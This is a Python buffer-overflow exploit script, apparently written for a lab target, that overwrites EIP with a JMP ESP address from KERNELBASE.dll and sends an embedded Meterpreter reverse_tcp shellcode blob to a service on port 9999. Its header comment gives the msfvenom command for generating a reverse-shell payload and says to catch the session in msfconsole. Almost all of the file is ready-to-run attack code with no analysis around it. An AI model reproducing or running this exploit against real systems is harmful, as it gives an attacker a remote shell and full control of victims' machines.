'''
Found a JMP ESP to a default dll, and change eip variable.
To generate the shellcode type on terminal: msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=PORT -f py -b "\x00\x0a\x0b"
Listen in the msfconsole
And run the exploit
'''
import socket

buffer = 'A' * 524
eip = '\xca\xe6\xce\x76' #76CEE6CA JMP ESP KERNELBASE.dll
#ca e6 ce 76

# shellcode reverse tcp meterpreter
buf =  ""
buf += "\xd9\xce\xd9\x74\x24\xf4\xbf\x2f\xfd\xba\x7d\x5a\x33"
buf += "\xc9\xb1\x56\x83\xc2\x04\x31\x7a\x14\x03\x7a\x3b\x1f"
buf += "\x4f\x81\xab\x5d\xb0\x7a\x2b\x02\x38\x9f\x1a\x02\x5e"
buf += "\xeb\x0c\xb2\x14\xb9\xa0\x39\x78\x2a\x33\x4f\x55\x5d"
buf += "\xf4\xfa\x83\x50\x05\x56\xf7\xf3\x85\xa5\x24\xd4\xb4"
buf += "\x65\x39\x15\xf1\x98\xb0\x47\xaa\xd7\x67\x78\xdf\xa2"
buf += "\xbb\xf3\x93\x23\xbc\xe0\x63\x45\xed\xb6\xf8\x1c\x2d"
buf += "\x38\x2d\x15\x64\x22\x32\x10\x3e\xd9\x80\xee\xc1\x0b"
buf += "\xd9\x0f\x6d\x72\xd6\xfd\x6f\xb2\xd0\x1d\x1a\xca\x23"
buf += "\xa3\x1d\x09\x5e\x7f\xab\x8a\xf8\xf4\x0b\x77\xf9\xd9"
buf += "\xca\xfc\xf5\x96\x99\x5b\x19\x28\x4d\xd0\x25\xa1\x70"
buf += "\x37\xac\xf1\x56\x93\xf5\xa2\xf7\x82\x53\x04\x07\xd4"
buf += "\x3c\xf9\xad\x9e\xd0\xee\xdf\xfc\xbc\xc3\xed\xfe\x3c"
buf += "\x4c\x65\x8c\x0e\xd3\xdd\x1a\x22\x9c\xfb\xdd\x33\x8a"
buf += "\xfb\x32\xfb\xdb\x05\xb3\xfb\xf2\xc1\xe7\xab\x6c\xe3"
buf += "\x87\x20\x6d\x0c\x52\xdc\x67\x9a\x9d\x88\x78\x30\x76"
buf += "\xca\x78\xd5\xda\x43\x9e\x85\xb2\x03\x0f\x66\x63\xe3"
buf += "\xff\x0e\x69\xec\x20\x2e\x92\x27\x49\xc5\x7d\x91\x21"
buf += "\x72\xe7\xb8\xba\xe3\xe8\x17\xc7\x24\x62\x9d\x37\xea"
buf += "\x83\xd4\x2b\x1b\xf4\x16\xb4\xdc\x91\x16\xde\xd8\x33"
buf += "\x41\x76\xe3\x62\xa5\xd9\x1c\x41\xb6\x1e\xe2\x14\x8e"
buf += "\x55\xd5\x82\xae\x01\x1a\x43\x2e\xd2\x4c\x09\x2e\xba"
buf += "\x28\x69\x7d\xdf\x36\xa4\x12\x4c\xa3\x47\x42\x20\x64"
buf += "\x20\x68\x1f\x42\xef\x93\x4a\xd0\xe8\x6b\x08\xff\x50"
buf += "\x03\xf2\xbf\x60\xd3\x98\x3f\x31\xbb\x57\x6f\xbe\x0b"
buf += "\x97\xba\x97\x03\x12\x2b\x55\xb2\x23\x66\x3b\x6a\x23"
buf += "\x85\xe0\x9d\x5e\xe6\x17\x5e\x9f\xee\x73\x5f\x9f\x0e"
buf += "\x82\x5c\x49\x37\xf0\xa3\x49\x0c\x0b\x96\xec\x25\x86"
buf += "\xd8\xa3\x36\x83"

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(('192.168.0.108',9999))
sock.recv(1024)
sock.sendall(buffer+eip+'\x90'*15+buf)
 